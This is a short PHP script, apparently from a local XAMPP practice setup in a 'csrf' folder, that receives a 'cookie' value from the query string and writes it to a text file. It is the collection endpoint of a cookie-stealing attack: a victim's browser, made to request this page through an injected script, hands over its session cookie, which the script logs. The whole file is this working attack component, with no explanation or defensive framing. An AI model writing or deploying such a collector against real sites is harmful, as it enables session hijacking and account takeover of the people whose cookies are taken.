<?php
if (!empty($_GET['cookie'])) {
    file_put_contents("C:/xampp/htdocs/csrf/cookie.txt", $_GET['cookie']);
}
?>

